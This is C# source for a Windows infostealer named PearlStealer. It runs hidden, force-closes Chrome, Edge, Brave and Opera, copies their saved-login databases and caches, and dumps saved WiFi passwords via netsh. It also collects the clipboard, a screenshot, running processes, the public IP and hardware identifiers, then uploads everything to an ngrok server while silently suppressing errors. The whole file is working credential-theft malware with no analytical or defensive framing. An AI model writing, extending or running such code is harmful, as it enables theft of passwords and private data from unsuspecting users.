using Microsoft.Win32;
using System.Collections;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Net.Http.Headers;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Security.Policy;
using System.Text;
using System.Text.RegularExpressions;

namespace PearlStealer
{
    public partial class PearlStealer : Form
    {
        public PearlStealer()
        {
            InitializeComponent();
        }

        private async void PearlStealer_Load(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            this.Hide();

            BrowserTransfer();

            try
            {
                // 1. Core Info
                string hostname = Dns.GetHostName();
                string IP = GetPublicIP();
                string nomeMacchina = Environment.MachineName;
                string dominio = Environment.UserDomainName;
                string nomeUtente = Environment.UserName;
                string os = Environment.OSVersion.ToString();
                Guid uuid = Guid.NewGuid();

                // 2. New Features
                string gpuInfo = GetGpuInfo();
                string wifiInfo = GetWifiInfo();
                string lanInfo = GetLanInfo();
                string processes = GetRunningProcesses();
                string clipboard = GetClipboardText();
                byte[] screenshot = CaptureScreenshot();

                // 3. System Diagnostic Features
                string cpuInfo = GetCpuDetails();
                string batteryInfo = GetBatteryStatus();
                string diskInfo = GetDiskSpace();
                string audioInfo = GetAudioDevices();
                string Motherboard = GetMotherboard();
                string guid = GetMachineGuid();

                string Hwid = HWID();

                // 4. Format Payload
                string payload = $"--- SYSTEM INFO ---\n" +
                                        $"Hostname: {hostname}\n" +
                                        $"IP Address: {IP}\n" +
                                        $"Machine: {nomeMacchina}\n" +
                                        $"Domain: {dominio}\n" +
                                        $"User: {nomeUtente}\n" +
                                        $"OS: {os}\n" +
                                        $"UUID: {uuid}\n\n" +
                                        $"--- HARDWARE ---\n" +
                                        $"CPU: {cpuInfo}\n" +
                                        $"GPU: {gpuInfo}\n" +
                                        $"Motherboard: {Motherboard}\n" +
                                        $"GUID: {guid}\n" +
                                        $"HWID: {Hwid}\n\n" +
                                        $"--- STORAGE ---\n\n" +
                                        $"{diskInfo}\n" +
                                        $"--- AUDIO ---\n\n" +
                                        $"{audioInfo}\n\n" +
                                        $"--- POWER ---\n\n" +
                                        $"{batteryInfo}\n\n" +
                                        $"--- NETWORK ---\n\n" +
                                        $"[LAN/Ethernet]\n{lanInfo}\n\n" +
                                        $"[WiFi]\n{wifiInfo}\n\n" +
                                        $"--- PROCESSES ---\n" +
                                        $"{processes}";

                string server = "https://factiously-nasolacrimal-minh.ngrok-free.dev/upload";

                string profileFolder = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

                string[] browsersFiles =
                {
                    Path.Combine(profileFolder, "chromePearl"),
                    Path.Combine(profileFolder, "edgePearl"),
                    Path.Combine(profileFolder, "bravePearl"),
                    Path.Combine(profileFolder, "operaPearl")
                };

                using (var client = new HttpClient())
                {
                    client.Timeout = TimeSpan.FromSeconds(30);

                    using (var form = new MultipartFormDataContent())
                    {
                        form.Add(new StringContent(payload), "testo");

                        if (screenshot != null)
                        {
                            var imageContent = new ByteArrayContent(screenshot);
                            imageContent.Headers.ContentType =
                                System.Net.Http.Headers.MediaTypeHeaderValue.Parse("image/png");

                            form.Add(imageContent, "screenshot", "screenshot.png");
                        }

                        foreach (string filePath in browsersFiles)
                        {
                            if (File.Exists(filePath))
                            {
                                var fileBytes = await File.ReadAllBytesAsync(filePath);

                                var fileContent = new ByteArrayContent(fileBytes);
                                fileContent.Headers.ContentType =
                                    System.Net.Http.Headers.MediaTypeHeaderValue.Parse("text/plain");

                                form.Add(
                                    fileContent,
                                    "files",                    
                                    Path.GetFileName(filePath)  
                                );
                            }
                        }

                        var response = await client.PostAsync(server, form);
                        response.EnsureSuccessStatusCode();
                    }
                }

                static string GetPublicIP()
                {
                    try
                    {
                        using (WebClient client = new WebClient())
                        {
                            return client.DownloadString("https://api.ipify.org").Trim();
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Errore: {ex.Message}");
                        return "Impossible to find IP";
                    }
                }

                static string GetGpuInfo()
                {
                    try
                    {
                        string gpu = "";
                        using (var searcher = new ManagementObjectSearcher("select * from Win32_VideoController"))
                        {
                            foreach (var obj in searcher.Get())
                            {
                                gpu += $"GPU: {obj["Name"]}\n";
                            }
                        }
                        return string.IsNullOrEmpty(gpu) ? "GPU: Not Found\n" : gpu;
                    }
                    catch { return "GPU: Access Denied\n"; }
                }

                static string GetRunningProcesses()
                {
                    try
                    {
                        var procList = Process.GetProcesses()
                            .Select(p => p.ProcessName)
                            .OrderBy(n => n)
                            .Distinct();
                        return string.Join("\n", procList);
                    }
                    catch { return "Processes: Access Denied"; }
                }

                static string GetClipboardText()
                {
                    try
                    {
                        string text = "";

                        if (Clipboard.ContainsText())
                        {
                            text = Clipboard.GetText();
                        }
                        return string.IsNullOrEmpty(text) ? "[Clipboard Empty]" : text;
                    }
                    catch { return "[Clipboard Access Denied]"; }
                }

                static string GetWifiInfo()
                {
                    try
                    {
                        string results = "";
                        ProcessStartInfo psi = new ProcessStartInfo("netsh", "wlan show profiles")
                        {
                            RedirectStandardOutput = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };
                        Process p = Process.Start(psi);
                        string output = p.StandardOutput.ReadToEnd();
                        p.WaitForExit();

                        var profiles = Regex.Matches(output, "All User Profile\\s*:\\s*(.*)");
                        foreach (Match match in profiles)
                        {
                            string name = match.Groups[1].Value.Trim();
                            results += $"SSID: {name}";

                            ProcessStartInfo psiKey = new ProcessStartInfo("netsh", $"wlan show profile name=\"{name}\" key=clear")
                            {
                                RedirectStandardOutput = true,
                                UseShellExecute = false,
                                CreateNoWindow = true
                            };
                            Process pKey = Process.Start(psiKey);
                            string outputKey = pKey.StandardOutput.ReadToEnd();
                            pKey.WaitForExit();

                            var keyMatch = Regex.Match(outputKey, "Key Content\\s*:\\s*(.*)");
                            if (keyMatch.Success)
                            {
                                results += $" | Pass: {keyMatch.Groups[1].Value.Trim()}\n";
                            }
                            else
                            {
                                results += " | Pass: [Requires Admin]\n";
                            }
                        }
                        return string.IsNullOrEmpty(results) ? "No WiFi Profiles found." : results;
                    }
                    catch { return "WiFi: Access Denied"; }
                }

                static string GetLanInfo()
                {
                    try
                    {
                        string info = "";
                        foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
                        {
                            if (ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet)
                            {
                                var props = ni.GetIPProperties();
                                info += $"Interface: {ni.Name}\n";
                                info += $"Description: {ni.Description}\n";
                                info += $"DNS Suffix: {props.DnsSuffix}\n";
                                info += $"Status: {ni.OperationalStatus}\n";
                                info += $"MAC: {ni.GetPhysicalAddress()}\n";
                                info += $"Password: [NOT APPLICABLE FOR LAN]\n";
                                info += "------------------\n";
                            }
                        }
                        return string.IsNullOrEmpty(info) ? "No Ethernet interfaces found.\n" : info;
                    }
                    catch { return "LAN: Access Denied\n"; }
                }

                static byte[] CaptureScreenshot()
                {
                    try
                    {
                        Rectangle bounds = Screen.PrimaryScreen.Bounds;
                        using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                        {
                            using (Graphics g = Graphics.FromImage(bitmap))
                            {
                                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                            }
                            using (MemoryStream ms = new MemoryStream())
                            {
                                bitmap.Save(ms, ImageFormat.Png);
                                return ms.ToArray();
                            }
                        }
                    }
                    catch { return null; }
                }

                static string GetCpuDetails()
                {
                    try
                    {
                        string info = "";
                        using (var searcher = new ManagementObjectSearcher("select * from Win32_Processor"))
                        {
                            foreach (var obj in searcher.Get())
                            {
                                info += $"Processor: {obj["Name"]}\n";
                                info += $"Cores: {obj["NumberOfCores"]}\n";
                                info += $"Threads: {obj["NumberOfLogicalProcessors"]}\n";
                            }
                        }
                        return string.IsNullOrEmpty(info) ? "CPU: Not Found\n" : info;
                    }
                    catch { return "CPU: Access Denied\n"; }
                }

                static string GetBatteryStatus()
                {
                    try
                    {
                        var query = new ObjectQuery("Select * from Win32_Battery");
                        var searcher = new ManagementObjectSearcher(query);
                        var collection = searcher.Get();
                        string info = "";
                        foreach (var obj in collection)
                        {
                            info += $"Status: {obj["Status"]}\n";
                            info += $"Charge: {obj["EstimatedChargeRemaining"]}%\n";
                        }
                        return string.IsNullOrEmpty(info) ? "Battery: No battery detected (Desktop?)\n" : info;
                    }
                    catch { return "Battery: Access Denied\n"; }
                }

                static string GetDiskSpace()
                {
                    try
                    {
                        string info = "";
                        foreach (DriveInfo drive in DriveInfo.GetDrives())
                        {
                            if (drive.IsReady)
                            {
                                double freeGB = drive.TotalFreeSpace / (1024.0 * 1024.0 * 1024.0);
                                double totalGB = drive.TotalSize / (1024.0 * 1024.0 * 1024.0);
                                info += $"Drive {drive.Name} ({drive.DriveFormat}): {freeGB:F2}GB free / {totalGB:F2}GB total\n";
                            }
                        }
                        return info;
                    }
                    catch { return "Disk: Access Denied\n"; }
                }

                static string GetAudioDevices()
                {
                    try
                    {
                        string info = "";

                        using (var searcher = new ManagementObjectSearcher(
                            "SELECT * FROM Win32_SoundDevice"))
                        {
                            foreach (ManagementObject obj in searcher.Get())
                            {
                                info += $"Device: {obj["Name"]}\n";
                            }
                        }

                        return string.IsNullOrEmpty(info)
                            ? "Audio: No devices found.\n"
                            : info;
                    }
                    catch
                    {
                        return "Audio: Access Denied\n";
                    }
                }

                static string GetMotherboard()
                {
                    try
                    {
                        using var mos = new ManagementObjectSearcher("SELECT SerialNumber FROM Win32_BaseBoard");
                        foreach (ManagementObject mo in mos.Get())
                            return mo["SerialNumber"]?.ToString();
                    }
                    catch { }
                    return "MB_UNKNOWN";
                }

                static string GetMachineGuid()
                {
                    try
                    {
                        return Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography", "MachineGuid", null)?.ToString();
                    }
                    catch { }
                    return "GUID_UNKNOWN";
                }

                static string ComputeSha256(string input)
                {
                    using SHA256 sha = SHA256.Create();
                    byte[] bytes = sha.ComputeHash(Encoding.UTF8.GetBytes(input));
                    StringBuilder sb = new StringBuilder();
                    foreach (byte b in bytes)
                        sb.Append(b.ToString("x2"));
                    return sb.ToString();
                }

                static string HWID()
                {
                    string raw = GetCpuDetails() + "|" + GetMotherboard() + "|" + GetMachineGuid();
                    return ComputeSha256(raw);
                }
            }
            catch
            {
                // Silently fail
            }
        }


        private void KillBrowserProcesses(string processName)
        {
            try
            {
                foreach (var process in Process.GetProcessesByName(processName))
                {
                    process.Kill();
                    process.WaitForExit(3000);
                }
            }
            catch { }
        }

        private void BrowserTransfer()
        {
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string localData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
            string programFilesX86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);

            var tasks = new List<Task>();

            string chromePath1 = Path.Combine(programFiles, "Google", "Chrome", "Application", "chrome.exe");
            string chromePath2 = Path.Combine(programFilesX86, "Google", "Chrome", "Application", "chrome.exe");

            if (File.Exists(chromePath1) || File.Exists(chromePath2))
            {
                string chromeData = Path.Combine(localData, "Google", "Chrome", "User Data", "Default", "Login Data");
                string DatabasePathChrome = Path.Combine(userProfile, "chromePearl");

                if (File.Exists(chromeData))
                {
                    tasks.Add(Task.Run(async () =>
                    {
                        KillBrowserProcesses("chrome");
                        await Task.Delay(5000);
                        if (File.Exists(DatabasePathChrome)) File.Delete(DatabasePathChrome);
                        try { File.Copy(chromeData, DatabasePathChrome, true); }
                        catch{ }
                    }));
                }
            }

            string edgePath1 = Path.Combine(programFiles, "Microsoft", "Edge", "Application", "msedge.exe");
            string edgePath2 = Path.Combine(programFilesX86, "Microsoft", "Edge", "Application", "msedge.exe");

            if (File.Exists(edgePath1) || File.Exists(edgePath2))
            {
                string edgeData = Path.Combine(localData, "Microsoft", "Edge", "User Data", "Default", "Login Data");
                string DatabasePathEdge = Path.Combine(userProfile, "edgePearl");

                if (File.Exists(edgeData))
                {
                    tasks.Add(Task.Run(async () =>
                    {
                        KillBrowserProcesses("msedge");
                        await Task.Delay(5000);
                        if (File.Exists(DatabasePathEdge)) File.Delete(DatabasePathEdge);
                        try { File.Copy(edgeData, DatabasePathEdge, true); }
                        catch { }
                    }));
                }
            }

            string bravePath1 = Path.Combine(programFiles, "BraveSoftware", "Brave-Browser", "Application", "brave.exe");
            string bravePath2 = Path.Combine(programFilesX86, "BraveSoftware", "Brave-Browser", "Application", "brave.exe");

            if (File.Exists(bravePath1) || File.Exists(bravePath2))
            {
                string braveData = Path.Combine(localData, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Cache", "Cache_Data");
                string DatabasePathBrave = Path.Combine(userProfile, "bravePearl");

                if (Directory.Exists(braveData))
                {
                    tasks.Add(Task.Run(async () =>
                    {
                        KillBrowserProcesses("brave");
                        await Task.Delay(5000);
                        if (File.Exists(DatabasePathBrave)) File.Delete(DatabasePathBrave);
                        try { File.Copy(braveData, DatabasePathBrave, true); }
                        catch { }
                    }));
                }
            }

            string operaInstalledPath = Path.Combine(localData, "Programs", "Opera GX");

            if (Directory.Exists(operaInstalledPath))
            {
                string operaData = Path.Combine(localData, "Opera Software", "Opera GX Stable", "Cache");
                string DatabasePathOpera = Path.Combine(userProfile, "operaPearl");

                if (Directory.Exists(operaData))
                {
                    tasks.Add(Task.Run(async () =>
                    {
                        KillBrowserProcesses("opera");
                        await Task.Delay(5000);
                        if (File.Exists(DatabasePathOpera)) File.Delete(DatabasePathOpera);
                        try { File.Copy(operaData, DatabasePathOpera, true); }
                        catch { }
                    }));
                }
            }
            Task.WaitAll(tasks.ToArray());
        }
    }
}
